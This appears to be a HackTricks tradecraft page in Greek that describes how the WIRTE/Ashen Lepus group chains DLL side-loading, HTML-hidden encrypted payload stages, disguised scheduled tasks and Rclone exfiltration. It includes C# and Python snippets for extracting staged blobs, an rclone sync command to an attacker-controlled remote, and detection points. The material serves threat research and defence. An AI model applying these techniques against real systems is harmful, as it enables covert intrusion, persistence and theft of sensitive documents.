# Προχωρημένο DLL Side-Loading με HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) όπλισε ένα επαναλαμβανόμενο μοτίβο που συνδέει DLL sideloading, staged HTML payloads, και modular .NET backdoors για να παραμείνει εντός διπλωματικών δικτύων της Μέσης Ανατολής. Η τεχνική μπορεί να επαναχρησιμοποιηθεί από οποιονδήποτε χειριστή επειδή βασίζεται σε:

- **Archive-based social engineering**: αβλαβή PDFs υποδεικνύουν στους στόχους να κατεβάσουν ένα RAR archive από έναν ιστότοπο κοινής χρήσης αρχείων. Το archive πακέτα ένα αυθεντικό-φαίνόμενο document viewer EXE, μια κακόβουλη DLL με όνομα που παραπέμπει σε αξιόπιστη βιβλιοθήκη (π.χ., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), και ένα παραπλανητικό `Document.pdf`.
- **DLL search order abuse**: το θύμα κάνει διπλό κλικ στο EXE, τα Windows επιλύουν το DLL import από τον current directory, και ο κακόβουλος loader (AshenLoader) εκτελείται μέσα στη διαδικασία που εμπιστεύονται ενώ το decoy PDF ανοίγει για να αποφευχθεί υποψία.
- **Living-off-the-land staging**: κάθε επόμενη φάση (AshenStager → AshenOrchestrator → modules) κρατιέται off disk μέχρι να χρειαστεί, παραδίδεται ως κρυπτογραφημένα blobs κρυμμένα μέσα σε διαφορετικά ακίνδυνα HTML responses.

## Πολυ-Στάδιο Side-Loading Chain

1. **Decoy EXE → AshenLoader**: το EXE side-loads AshenLoader, ο οποίος πραγματοποιεί host recon, το κρυπτογραφεί με AES-CTR, και το POSTάρει μέσα σε περιστρεφόμενες παραμέτρους όπως `token=`, `id=`, `q=`, ή `auth=` προς μοιάζοντα με API μονοπάτια (π.χ., `/api/v2/account`).
2. **HTML extraction**: το C2 αποκαλύπτει μόνο το επόμενο στάδιο όταν το client IP γεωεντοπιστεί στην στοχευόμενη περιοχή και το `User-Agent` ταιριάζει με το implant, δυσκολεύοντας sandboxes. Όταν οι έλεγχοι περάσουν το HTTP body περιέχει ένα `<headerp>...</headerp>` blob με το Base64/AES-CTR κρυπτογραφημένο AshenStager payload.
3. **Second sideload**: το AshenStager αναπτύσσεται μαζί με ένα άλλο νόμιμο binary που imports `wtsapi32.dll`. Η κακόβουλη αντιγραφή εγχεόμενη στο binary ανακτά περισσότερο HTML, αυτή τη φορά εξάγοντας `<article>...</article>` για να ανακτήσει το AshenOrchestrator.
4. **AshenOrchestrator**: ένας modular .NET controller που αποκωδικοποιεί ένα Base64 JSON config. Τα πεδία `tg` και `au` του config συνενώνονται/χαρτογραφούνται σε hash για να παραχθεί το AES key, το οποίο αποκρυπτογραφεί το `xrk`. Τα προκύπτοντα bytes λειτουργούν ως XOR key για κάθε module blob που ανακτάται στη συνέχεια.
5. **Module delivery**: κάθε module περιγράφεται μέσω HTML comments που ανακατευθύνουν τον parser σε ένα αυθαίρετο tag, παραβιάζοντας στατικούς κανόνες που ψάχνουν μόνο για `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), και file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Ακόμη και αν οι αμυνόμενοι μπλοκάρουν ή αφαιρούν κάποιο συγκεκριμένο στοιχείο, ο χειριστής χρειάζεται μόνο να αλλάξει την ετικέτα που υποδεικνύεται στο σχόλιο HTML για να ξαναρχίσει την παράδοση.

### Γρήγορος Βοηθός Εξαγωγής (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging — Παραλληλισμοί αποφυγής

Πρόσφατη έρευνα για το HTML smuggling (Talos) επισημαίνει payloads που κρύβονται ως Base64 strings μέσα σε μπλοκ `<script>` σε HTML attachments και αποκωδικοποιούνται μέσω JavaScript κατά το runtime. Το ίδιο κόλπο μπορεί να ξαναχρησιμοποιηθεί για C2 responses: stage encrypted blobs μέσα σε ένα script tag (ή άλλο DOM στοιχείο) και αποκωδικοποιήστε τα in-memory πριν από AES/XOR, κάνοντας τη σελίδα να μοιάζει με απλό HTML. Η Talos δείχνει επίσης στρωματοποιημένη αποπροσωποποίηση (identifier renaming plus Base64/Caesar/AES) μέσα σε script tags, που αντιστοιχίζεται καθαρά σε HTML-staged C2 blobs.

## Σημειώσεις για Πρόσφατες Παραλλαγές (2024-2025)

- Check Point παρατήρησε καμπάνιες WIRTE το 2024 που εξακολουθούσαν να βασίζονται σε archive-based sideloading αλλά χρησιμοποίησαν `propsys.dll` (stagerx64) ως το πρώτο στάδιο. Ο stager αποκωδικοποιεί το επόμενο payload με Base64 + XOR (key `53`), στέλνει HTTP αιτήματα με σκληροκωδικοποιημένο `User-Agent`, και εξάγει encrypted blobs ενσωματωμένα ανάμεσα σε HTML tags. Σε έναν κλάδο, το stage ανασυστήθηκε από μια μακριά λίστα ενσωματωμένων IP strings που αποκωδικοποιήθηκαν μέσω `RtlIpv4StringToAddressA`, και στη συνέχεια συνενώθηκαν σε bytes του payload.
- OWN-CERT τεκμηρίωσε προγενέστερο tooling της WIRTE όπου ο side-loaded `wtsapi32.dll` dropper προστάτευε strings με Base64 + TEA και χρησιμοποιούσε το ίδιο το όνομα του DLL ως decryption key, και στη συνέχεια έκανε XOR/Base64 αποσιώπηση των δεδομένων ταυτοποίησης host πριν τα στείλει στο C2.

## Crypto & C2 Σκληραγώγηση

- **AES-CTR everywhere**: οι τρέχοντες loaders ενσωματώνουν 256-bit keys μαζί με nonces (π.χ., `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα XOR layer χρησιμοποιώντας strings όπως `msasn1.dll` πριν/μετά την αποκρυπτογράφηση.
- **Key material variations**: προηγούμενοι loaders χρησιμοποίησαν Base64 + TEA για να προστατέψουν ενσωματωμένα strings, με το decryption key να προέρχεται από το κακόβουλο όνομα DLL (π.χ., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: οι staging servers διαχωρίζονται ανά εργαλείο, φιλοξενούνται σε διάφορα ASNs, και κάποιες φορές εμφανίζονται πίσω από υποτομείς που μοιάζουν νόμιμοι, έτσι το burning ενός σταδίου δεν εκθέτει τα υπόλοιπα.
- **Recon smuggling**: τα enumerated δεδομένα τώρα περιλαμβάνουν καταλόγους Program Files για να εντοπίσουν εφαρμογές υψηλής αξίας και πάντα κρυπτογραφούνται πριν φύγουν από τον host.
- **URI churn**: τα query parameters και τα REST paths εναλλάσσονται μεταξύ καμπανιών (`/api/v1/account?token=` → `/api/v2/account?auth=`), ακυρώνοντας ευάλωτες ανιχνεύσεις.
- **User-Agent pinning + safe redirects**: η C2 infrastructure απαντά μόνο σε ακριβή UA strings και αλλιώς ανακατευθύνει σε αθώες ειδησεογραφικές/υγειονομικές σελίδες για να ενσωματωθεί.
- **Gated delivery**: οι servers είναι γεω-περιορισμένοι και απαντούν μόνο σε πραγματικά implants. Μη εγκεκριμένοι clients λαμβάνουν μη ύποπτο HTML.

## Persistence και Βρόχος Εκτέλεσης

Ο AshenStager ρίχνει scheduled tasks που μιμούνται Windows maintenance jobs και εκτελούνται μέσω του `svchost.exe`, π.χ.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτές οι εργασίες επανεκκινούν την αλυσίδα sideloading κατά την εκκίνηση ή σε διαστήματα, εξασφαλίζοντας ότι ο AshenOrchestrator μπορεί να ζητήσει νέα modules χωρίς να γράψει ξανά στο δίσκο.

## Χρήση Benign Sync Clients για Exfiltration

Οι χειριστές τοποθετούν diplomatic documents μέσα στο `C:\Users\Public` (world-readable και μη ύποπτο) μέσω ενός ειδικού module, και στη συνέχεια κατεβάζουν το νόμιμο δυαδικό [Rclone](https://rclone.org/) για να συγχρονίσουν αυτόν τον κατάλογο με storage ελεγχόμενο από τον attacker. Η Unit42 σημειώνει ότι αυτή είναι η πρώτη φορά που αυτός ο actor παρατηρήθηκε να χρησιμοποιεί Rclone για exfiltration, ευθυγραμμιζόμενο με τη γενικότερη τάση κατάχρησης νόμιμων sync εργαλείων για να συγχωνεύονται με την κανονική κίνηση:

1. **Stage**: αντιγραφή/συλλογή αρχείων στόχου στο `C:\Users\Public\{campaign}\`.
2. **Configure**: αποστολή ενός Rclone config που δείχνει σε attacker-controlled HTTPS endpoint (π.χ., `api.technology-system[.]com`).
3. **Sync**: εκτέλεση `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` έτσι ώστε η κίνηση να μοιάζει με συνηθισμένα cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως για νόμιμα backup workflows, οι αμυνόμενοι πρέπει να επικεντρωθούν σε ανωμαλίες εκτέλεσης (νέα binaries, παράξενα remotes, ή ξαφνικός συγχρονισμός του `C:\Users\Public`).

## Σημεία Ανίχνευσης

- Alert on **signed processes** που απρόσμενα φορτώνουν DLLs από user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), ειδικά όταν τα ονόματα DLL επικαλύπτονται με `netutils`, `srvcli`, `dwampi`, ή `wtsapi32`.
- Εξετάστε ύποπτες HTTPS απαντήσεις για **μεγάλα Base64 blobs ενσωματωμένα μέσα σε ασυνήθιστα tags** ή προστατευμένα από σχόλια `<!-- TAG: <xyz> -->`.
- Επεκτείνετε το HTML hunting σε **Base64 strings μέσα σε μπλοκ `<script>`** (HTML smuggling-style staging) που αποκωδικοποιούνται μέσω JavaScript πριν το AES/XOR processing.
- Εντοπίστε **scheduled tasks** που εκτελούν `svchost.exe` με μη-service arguments ή δείχνουν πίσω σε dropper directories.
- Παρακολουθήστε **C2 redirects** που επιστρέφουν payloads μόνο για ακριβή `User-Agent` strings και αλλιώς αναπηδούν σε νόμιμους ειδησεογραφικούς/υγειονομικούς τομείς.
- Παρακολουθήστε για **Rclone** binaries που εμφανίζονται έξω από IT-managed locations, νέα `rclone.conf` αρχεία, ή sync jobs που τραβούν από staging directories όπως `C:\Users\Public`.

## Αναφορές

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
